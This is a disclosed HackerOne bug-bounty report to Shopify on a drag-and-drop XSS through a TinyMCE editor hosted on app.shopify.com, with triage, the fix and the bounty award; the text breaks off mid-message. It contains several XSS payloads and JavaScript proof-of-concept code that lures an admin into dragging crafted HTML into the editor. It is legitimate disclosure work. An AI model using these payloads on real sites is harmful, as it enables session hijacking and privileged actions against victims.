{"id":262230,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNjIyMzA=","url":"https://hackerone.com/reports/262230","title":"Tinymce 2.4.0","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-08-22T14:25:51.537Z","submitted_at":"2017-08-22T14:25:51.537Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jelmer","url":"/jelmer","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/012/636/5497b7f89b51e0320e32f2fd125a6dc9fe7e11dd_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-09-26T14:46:20.938Z","bug_reporter_agreed_on_going_public_at":"2017-09-26T14:46:20.867Z","team_member_agreed_on_going_public_at":"2017-09-25T20:51:47.418Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello,\n\nThe following url\n  * https://app.shopify.com//services/mobile_app/rte\n\nLoads https://cdn.shopify.com/s/assets/mobile_app/rte-bundle-f044a6c638b6c0500848c772dd5c86bf0eb2b27516c0860c6d3ddafde42231e2.js which is a minified tinymce 2.4.0.\n\nThis version of tinymce has known vulnerabilities but in order to trigger them the attacker needs access to tinymce's functionality. To achieve this I came up with a drag drop scenario which goes as follows:\n  * Attacker lures Shopify admin to controlled website\n  * Attacker convinces admin to drag element on the page which has an ondragstart prop with event.dataTransfer.setData+text/html mime (event.dataTransfer.setData('text/html', payload))\n  * Immediatly after the drag the attacker redirects the user to Shopify. This does not violate the XFO 'DENY' setting (https://app.shopify.com//services/mobile_app/rte)\n  * Victim releases the mouse button after loading the tinymce and the dragged data gets rendered by tinymce (tinymce is fullscreen so it doesn't matter where you drop it on the screen)\n\nWhile I couldn't get a tinymce XSS to trigger it does illustrate an attacker can make tinymce render something. Underneath are the vulnerabilities I tried with associated payload.\n\n[XSS through a href data url](https://github.com/cybersecurityworks/Disclosed/issues/10)\n\n```\n\u003ca href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=\" target=\"_blank\"\u003eFirfox\u003c/a\u003e\n```\n[Filter confusion 1](https://github.com/tinymce/tinymce/issues/3114)\n```\n'\"\u003e\u003e\u003cmarquee\u003e\u003cimg src=x onerror=confirm(1)\u003e\u003c/marquee\u003e\"\u003e\u003c/plaintext\\\u003e\u003c/|\\\u003e\u003cplaintext/onmouseover=prompt(1)\u003e\n```\n[Filter confusion 2](https://hackerone.com/reports/81736) and [here](https://github.com/tinymce/tinymce/issues/2356)\n```\n\u003cHTML xmlns: \u003e\u003caudio\u003e\n\u003caudio src=wp onerror=alert(0X1)\u003e\n```\n[Filter confusion 3](https://github.com/tinymce/tinymce/issues/2132)\n```\n\u0026ltg;?\"\u003e\u0026ltg;iframe SRC=\u0026#106\u0026#97\u0026#118\u0026#97\u0026#115\u0026#99\u0026#114\u0026#105\u0026#112\u0026#116\u0026#58\u0026#97\u0026#108\u0026#101\u0026#114\u0026#116\u0026#40\u0026#39\u0026#88\u0026#83\u0026#83\u0026#39\u0026#41\u003e?\u003e\n```\n\nWhile unable to create a proper PoC the availability of the vulnerable library presented in the way it is might be of your interest.\n\nHere is the poc:\n```\n\u003cdiv draggable=\"true\" ondragstart=\"event.dataTransfer.setData('text/html', '\u003cimg src=\\'https://cdn.shopify.com/shopify-marketing_assets/static/shopify-favicon.png\\'/\u003e'); document.location='https://app.shopify.com//services/mobile_app/rte'\"\u003edrag\u003c/div\u003e\n```\nSave that as a html file, open with firefox, drag the div and release it after the page redirected. Tinymce will then render the favicon.\n\nConsidering the things that live under this subdomain + CSRF token handout on page successful exploitation of this could get pretty disastrous.","vulnerability_information_html":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eThe following url\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca title=\"https://app.shopify.com//services/mobile_app/rte\" href=\"/redirect?url=https%3A%2F%2Fapp.shopify.com%2F%2Fservices%2Fmobile_app%2Frte\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://app.shopify.com//services/mobile_app/rte\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eLoads \u003ca title=\"https://cdn.shopify.com/s/assets/mobile_app/rte-bundle-f044a6c638b6c0500848c772dd5c86bf0eb2b27516c0860c6d3ddafde42231e2.js\" href=\"/redirect?url=https%3A%2F%2Fcdn.shopify.com%2Fs%2Fassets%2Fmobile_app%2Frte-bundle-f044a6c638b6c0500848c772dd5c86bf0eb2b27516c0860c6d3ddafde42231e2.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://cdn.shopify.com/s/assets/mobile_app/rte-bundle-f044a6c638b6c0500848c772dd5c86bf0eb2b27516c0860c6d3ddafde42231e2.js\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e which is a minified tinymce 2.4.0.\u003c/p\u003e\n\n\u003cp\u003eThis version of tinymce has known vulnerabilities but in order to trigger them the attacker needs access to tinymce\u0026#39;s functionality. To achieve this I came up with a drag drop scenario which goes as follows:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eAttacker lures Shopify admin to controlled website\u003c/li\u003e\n\u003cli\u003eAttacker convinces admin to drag element on the page which has an ondragstart prop with event.dataTransfer.setData+text/html mime (event.dataTransfer.setData(\u0026#39;text/html\u0026#39;, payload))\u003c/li\u003e\n\u003cli\u003eImmediatly after the drag the attacker redirects the user to Shopify. This does not violate the XFO \u0026#39;DENY\u0026#39; setting (\u003ca title=\"https://app.shopify.com//services/mobile_app/rte\" href=\"/redirect?url=https%3A%2F%2Fapp.shopify.com%2F%2Fservices%2Fmobile_app%2Frte\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://app.shopify.com//services/mobile_app/rte\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e)\u003c/li\u003e\n\u003cli\u003eVictim releases the mouse button after loading the tinymce and the dragged data gets rendered by tinymce (tinymce is fullscreen so it doesn\u0026#39;t matter where you drop it on the screen)\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eWhile I couldn\u0026#39;t get a tinymce XSS to trigger it does illustrate an attacker can make tinymce render something. Underneath are the vulnerabilities I tried with associated payload.\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fcybersecurityworks%2FDisclosed%2Fissues%2F10\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eXSS through a href data url\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;a href=\u0026quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=\u0026quot; target=\u0026quot;_blank\u0026quot;\u0026gt;Firfox\u0026lt;/a\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Ftinymce%2Ftinymce%2Fissues%2F3114\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eFilter confusion 1\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026#39;\u0026quot;\u0026gt;\u0026gt;\u0026lt;marquee\u0026gt;\u0026lt;img src=x onerror=confirm(1)\u0026gt;\u0026lt;/marquee\u0026gt;\u0026quot;\u0026gt;\u0026lt;/plaintext\\\u0026gt;\u0026lt;/|\\\u0026gt;\u0026lt;plaintext/onmouseover=prompt(1)\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca href=\"https://hackerone.com/reports/81736\"\u003eFilter confusion 2\u003c/a\u003e and \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Ftinymce%2Ftinymce%2Fissues%2F2356\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehere\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;HTML xmlns: \u0026gt;\u0026lt;audio\u0026gt;\n\u0026lt;audio src=wp onerror=alert(0X1)\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Ftinymce%2Ftinymce%2Fissues%2F2132\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eFilter confusion 3\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026amp;ltg;?\u0026quot;\u0026gt;\u0026amp;ltg;iframe SRC=\u0026amp;#106\u0026amp;#97\u0026amp;#118\u0026amp;#97\u0026amp;#115\u0026amp;#99\u0026amp;#114\u0026amp;#105\u0026amp;#112\u0026amp;#116\u0026amp;#58\u0026amp;#97\u0026amp;#108\u0026amp;#101\u0026amp;#114\u0026amp;#116\u0026amp;#40\u0026amp;#39\u0026amp;#88\u0026amp;#83\u0026amp;#83\u0026amp;#39\u0026amp;#41\u0026gt;?\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhile unable to create a proper PoC the availability of the vulnerable library presented in the way it is might be of your interest.\u003c/p\u003e\n\n\u003cp\u003eHere is the poc:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;div draggable=\u0026quot;true\u0026quot; ondragstart=\u0026quot;event.dataTransfer.setData(\u0026#39;text/html\u0026#39;, \u0026#39;\u0026lt;img src=\\\u0026#39;https://cdn.shopify.com/shopify-marketing_assets/static/shopify-favicon.png\\\u0026#39;/\u0026gt;\u0026#39;); document.location=\u0026#39;https://app.shopify.com//services/mobile_app/rte\u0026#39;\u0026quot;\u0026gt;drag\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSave that as a html file, open with firefox, drag the div and release it after the page redirected. Tinymce will then render the favicon.\u003c/p\u003e\n\n\u003cp\u003eConsidering the things that live under this subdomain + CSRF token handout on page successful exploitation of this could get pretty disastrous.\u003c/p\u003e\n","bounty_amount":"2000.0","formatted_bounty":"$2,000","weakness":{"id":63,"name":"Cross-site Scripting (XSS) - DOM"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":34,"voters":["flamezzz","sp1d3rs","jensec","bl4de","bogdantcaciuc","003random","almroot","encrypt","tulswani","bugdiscloseguys","and 24 more..."],"severity":{"rating":"medium","score":4.8,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"high","integrity":"high","availability":"none"}},"structured_scope":{"databaseId":418,"asset_type":"URL","asset_identifier":"apps.shopify.com","max_severity":"medium"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1946385,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Thank you for your report.\n\nCould you provide us with a concrete, plausible exploitation scenario that doesn't involve social engineering?","markdown_message":"\u003cp\u003eThank you for your report.\u003c/p\u003e\n\n\u003cp\u003eCould you provide us with a concrete, plausible exploitation scenario that doesn\u0026#39;t involve social engineering?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-22T14:43:53.381Z","updated_at":"2017-08-22T14:43:53.381Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1947426,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi Clayton,\n\nThanks for your timely response, you made me explore that rabbit hole pretty thoroughly but I finally got it!\n\nTinymce was more recent than initially estimated. It's version 4.3.something and no working XSS could be found.\n\nIn Firefox it is possible to drag multiple items at once. When for example text is selected and the dragstart event is dispatched, both items will be present in the event.dataTransfer. This confused tinymce.\nThis combined with a video onloadstart followed by a source element to trick the browser to load \u0026 dispatch the event will trigger a XSS.\n\nTo select the text of an element automatically in JavaScript we do the following.\n```\n  var selection = window.getSelection();\n  var range = document.createRange();\n  range.selectNodeContents(document.getElementById(\"drag\"));\n  selection.removeAllRanges();\n  selection.addRange(range);\n\n```\n\nAnd adding an event for dragstart would look like this:\n\n```\n        el.addEventListener(\"dragstart\", function(ev){\n                ev.dataTransfer.setData('text/html', '\u003cvideo onloadstart=\"document.write(/xss/)\"\u003e\u003csource/\u003e');\n                document.location='https://app.shopify.com//services/mobile_app/rte';\n        });\n```\n\nThe idea is that the victim will drag and release the video element while having the text selected essentially dragging 2 objects at once.\n\nSince the font must be dragged I made it huge \u0026 auto select it.\n\nThere is preloading going on in the background already from the beginning. This to smoothen the transition from dragstart to drop. The app.shopify.com target must be fully loaded before the mouse button is released. I managed to bring that process down to quite a bit.\n\nThe payload is automatically encoded just to make things easier.\n\nX-Frame-Options is set to 'DENY'. This doesn't matter because we do a document.location change \u0026\u0026 drop.\n\nI know that there is privileged functionality on this domain. Only the CSRF token is required to make requests to that location.","markdown_message":"\u003cp\u003eHi Clayton,\u003c/p\u003e\n\n\u003cp\u003eThanks for your timely response, you made me explore that rabbit hole pretty thoroughly but I finally got it!\u003c/p\u003e\n\n\u003cp\u003eTinymce was more recent than initially estimated. It\u0026#39;s version 4.3.something and no working XSS could be found.\u003c/p\u003e\n\n\u003cp\u003eIn Firefox it is possible to drag multiple items at once. When for example text is selected and the dragstart event is dispatched, both items will be present in the event.dataTransfer. This confused tinymce.\u003cbr\u003e\nThis combined with a video onloadstart followed by a source element to trick the browser to load \u0026amp; dispatch the event will trigger a XSS.\u003c/p\u003e\n\n\u003cp\u003eTo select the text of an element automatically in JavaScript we do the following.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e  var selection = window.getSelection();\n  var range = document.createRange();\n  range.selectNodeContents(document.getElementById(\u0026quot;drag\u0026quot;));\n  selection.removeAllRanges();\n  selection.addRange(range);\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd adding an event for dragstart would look like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e        el.addEventListener(\u0026quot;dragstart\u0026quot;, function(ev){\n                ev.dataTransfer.setData(\u0026#39;text/html\u0026#39;, \u0026#39;\u0026lt;video onloadstart=\u0026quot;document.write(/xss/)\u0026quot;\u0026gt;\u0026lt;source/\u0026gt;\u0026#39;);\n                document.location=\u0026#39;https://app.shopify.com//services/mobile_app/rte\u0026#39;;\n        });\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe idea is that the victim will drag and release the video element while having the text selected essentially dragging 2 objects at once.\u003c/p\u003e\n\n\u003cp\u003eSince the font must be dragged I made it huge \u0026amp; auto select it.\u003c/p\u003e\n\n\u003cp\u003eThere is preloading going on in the background already from the beginning. This to smoothen the transition from dragstart to drop. The app.shopify.com target must be fully loaded before the mouse button is released. I managed to bring that process down to quite a bit.\u003c/p\u003e\n\n\u003cp\u003eThe payload is automatically encoded just to make things easier.\u003c/p\u003e\n\n\u003cp\u003eX-Frame-Options is set to \u0026#39;DENY\u0026#39;. This doesn\u0026#39;t matter because we do a document.location change \u0026amp;\u0026amp; drop.\u003c/p\u003e\n\n\u003cp\u003eI know that there is privileged functionality on this domain. Only the CSRF token is required to make requests to that location.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-22T23:34:16.836Z","updated_at":"2017-08-22T23:34:16.836Z","actor":{"username":"jelmer","cleared":true,"url":"/jelmer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/636/5497b7f89b51e0320e32f2fd125a6dc9fe7e11dd_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":215030,"filename":"demo.mp4","type":"video/mp4","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/215/030/23d6a43a96dedd44e6a602c98de12daf530a9a9b/demo.mp4?response-content-disposition=attachment%3B%20filename%3D%22demo.mp4%22%3B%20filename%2A%3DUTF-8%27%27demo.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVBWWKZ4H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T051531Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCmEbZvVQ%2FI1GHRJjrhZK2Y6zh4lCWK725%2FwOpNu%2BnZkAIhAIZlqGHog%2B4PZMdnvhSU5APZbycPDz1wpNXbi5uE94ueKrQDCFUQARoMMDEzNjE5Mjc0ODQ5IgxU5AAHhqo1cPAzbTcqkQOGB5pEHXl6QCBCTSHUmyd%2FF8M3rpTqzp%2BOigrWU%2BrXYHZYm%2BGDawsiXhnqeD9o8Qw0b%2Fr0efVbRmhj5baoPrxgSiY%2B9zsreR3qClZZKnS0%2Brs8OqiMGd3clBbyfOxw2fa2vgQglV4dLF6EXSiGfxOms8eWdw%2F8mPtc81dMxDIlxTs50KUnd6aUjgG5BJs2k%2FL0rOKXYBS%2FdVqIQdN8JcCKMvqDv0u7pvSGEecQXa7pGdf07ufO02E64eU0OnaTeNyoq7WlZzT%2FGyvHjVtIvbXdPW15pwZm2Q4u8%2FW7ksSv4%2BxsESWLLCop0OeGUhtIppCDQlaMPC9JTj0HYKbMEGmZagmLfgHX4DKRg75%2FLNQViGcE%2FRCCaMxd6wrsv0dlz4dekjWvp4mXzLFkuKBM6c%2F%2BAemkmkgOJKnp%2FJUV1zJTe%2BO14GyIigsvxJqvrnKvkmsUrYwar1bX%2Be7UkqGzVbMAlsbRDNIOok7bVRXerhpXnbqFQsLWlqe%2BNfa4gSSfmgu4iIjCRRMdTWsvy2NQHfTsGjDAzar%2FBTrqAcniMm3eG7%2BxDZb9XVqMyQiSNyiuBD8pwO78bO8T3Uu8vSI3S05C6UCutmNkOnjR9D2NZaOgbFO4YujbW%2FY0mhhdjSppvg%2Bzdgu0AfZOou0DDwqm4vwEc0ekiNYUD6KHvD5tZwOaalihV5dSfbzoDyvfsJI6x7RYpBZmwPcshKw3Csz0uZew1JqrbUJVmc9v6q0aXols8bxyDKKPfp6siyzKhHELgTS3XGskds%2BWx5FaWemc%2Bo8QqyIuoOtWjmUwF39ydFOfg%2FyeKdwBxELGLKCSN8MyV6ov7IBrib4UiM%2F6l36ymDoHIX8ohg%3D%3D\u0026X-Amz-Signature=7ecd1993aa144af74cb34db84a666b15ada53b24e789c25d071e261eda479ff8"},{"id":215029,"filename":"exploit.html","type":"text/html","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/215/029/6170834c1d67078815a52788358c6f05baa28575/exploit.html?response-content-disposition=attachment%3B%20filename%3D%22exploit.html%22%3B%20filename%2A%3DUTF-8%27%27exploit.html\u0026response-content-type=application%2Foctet-stream\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVBWWKZ4H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T051531Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCmEbZvVQ%2FI1GHRJjrhZK2Y6zh4lCWK725%2FwOpNu%2BnZkAIhAIZlqGHog%2B4PZMdnvhSU5APZbycPDz1wpNXbi5uE94ueKrQDCFUQARoMMDEzNjE5Mjc0ODQ5IgxU5AAHhqo1cPAzbTcqkQOGB5pEHXl6QCBCTSHUmyd%2FF8M3rpTqzp%2BOigrWU%2BrXYHZYm%2BGDawsiXhnqeD9o8Qw0b%2Fr0efVbRmhj5baoPrxgSiY%2B9zsreR3qClZZKnS0%2Brs8OqiMGd3clBbyfOxw2fa2vgQglV4dLF6EXSiGfxOms8eWdw%2F8mPtc81dMxDIlxTs50KUnd6aUjgG5BJs2k%2FL0rOKXYBS%2FdVqIQdN8JcCKMvqDv0u7pvSGEecQXa7pGdf07ufO02E64eU0OnaTeNyoq7WlZzT%2FGyvHjVtIvbXdPW15pwZm2Q4u8%2FW7ksSv4%2BxsESWLLCop0OeGUhtIppCDQlaMPC9JTj0HYKbMEGmZagmLfgHX4DKRg75%2FLNQViGcE%2FRCCaMxd6wrsv0dlz4dekjWvp4mXzLFkuKBM6c%2F%2BAemkmkgOJKnp%2FJUV1zJTe%2BO14GyIigsvxJqvrnKvkmsUrYwar1bX%2Be7UkqGzVbMAlsbRDNIOok7bVRXerhpXnbqFQsLWlqe%2BNfa4gSSfmgu4iIjCRRMdTWsvy2NQHfTsGjDAzar%2FBTrqAcniMm3eG7%2BxDZb9XVqMyQiSNyiuBD8pwO78bO8T3Uu8vSI3S05C6UCutmNkOnjR9D2NZaOgbFO4YujbW%2FY0mhhdjSppvg%2Bzdgu0AfZOou0DDwqm4vwEc0ekiNYUD6KHvD5tZwOaalihV5dSfbzoDyvfsJI6x7RYpBZmwPcshKw3Csz0uZew1JqrbUJVmc9v6q0aXols8bxyDKKPfp6siyzKhHELgTS3XGskds%2BWx5FaWemc%2Bo8QqyIuoOtWjmUwF39ydFOfg%2FyeKdwBxELGLKCSN8MyV6ov7IBrib4UiM%2F6l36ymDoHIX8ohg%3D%3D\u0026X-Amz-Signature=14150da931b48711ea5d9b1d1ec2411f663fbc396f814f479d1bfa45a4673696"}],"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1949349,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"@jelmer Thanks for taking the time to improve your proof of concept. We were able to reproduce the issue, and our engineering team is investigating a fix.","markdown_message":"\u003cp\u003e\u003ca href=\"/jelmer\"\u003e@jelmer\u003c/a\u003e Thanks for taking the time to improve your proof of concept. We were able to reproduce the issue, and our engineering team is investigating a fix.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-23T16:37:04.274Z","updated_at":"2017-08-23T16:37:04.274Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1951204,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"My pleasure. Maybe it's worth looking into hosting [this](https://app.shopify.com//services/mobile_app/rte) on cdn.shopify.com as well. The js/css already come from there. Another idea would be to harden tinymce by [disallowing pasting data images](https://www.tinymce.com/docs/plugins/paste/#paste_data_images), that will also prevent drag/dropping images (not sure if this includes other media). Including it in your patch cycle should keep it up-to-date however considering tinymce's history there should still be some XSSes sleeping in there.","markdown_message":"\u003cp\u003eMy pleasure. Maybe it\u0026#39;s worth looking into hosting \u003ca href=\"/redirect?url=https%3A%2F%2Fapp.shopify.com%2F%2Fservices%2Fmobile_app%2Frte\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ethis\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e on cdn.shopify.com as well. The js/css already come from there. Another idea would be to harden tinymce by \u003ca href=\"/redirect?url=https%3A%2F%2Fwww.tinymce.com%2Fdocs%2Fplugins%2Fpaste%2F%23paste_data_images\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003edisallowing pasting data images\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, that will also prevent drag/dropping images (not sure if this includes other media). Including it in your patch cycle should keep it up-to-date however considering tinymce\u0026#39;s history there should still be some XSSes sleeping in there.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-24T09:08:46.589Z","updated_at":"2017-08-24T09:08:46.589Z","actor":{"username":"jelmer","cleared":true,"url":"/jelmer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/636/5497b7f89b51e0320e32f2fd125a6dc9fe7e11dd_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1951924,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e Maybe it's worth looking into hosting this on cdn.shopify.com as well.\n\nYes, that's what we were planning to do. We'll get back to you as this progresses.","markdown_message":"\u003cblockquote\u003e\n\u003cp\u003eMaybe it\u0026#39;s worth looking into hosting this on cdn.shopify.com as well.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eYes, that\u0026#39;s what we were planning to do. We\u0026#39;ll get back to you as this progresses.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-24T12:45:16.454Z","updated_at":"2017-08-24T12:45:16.454Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2021715,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report. We've resolved the issue by moving the rich text editor from app.shopify.com to cdn.shopify.com, as discussed previously.\n\nOur next round of bounty decisions will take place later this week, so we'll be in touch with you again soon.","markdown_message":"\u003cp\u003eThanks again for your report. We\u0026#39;ve resolved the issue by moving the rich text editor from app.shopify.com to cdn.shopify.com, as discussed previously.\u003c/p\u003e\n\n\u003cp\u003eOur next round of bounty decisions will take place later this week, so we\u0026#39;ll be in touch with you again soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-09-25T17:51:29.799Z","updated_at":"2017-09-25T17:51:29.799Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jelmer","url":"/jelmer"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2022542,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"We decided to award 2000$ in this case because it demonstrates a XSS on a high value domain, app.shopify.com which hosts the internal area of Shopify accessible only to employees. We appreciated that @jelmer took the time to write a proof of concept, because it demonstrated that TinyMCE was exploitable when we did not think an exploit was possible was at first glance.","markdown_message":"\u003cp\u003eWe decided to award 2000$ in this case because it demonstrates a XSS on a high value domain, app.shopify.com which hosts the internal area of 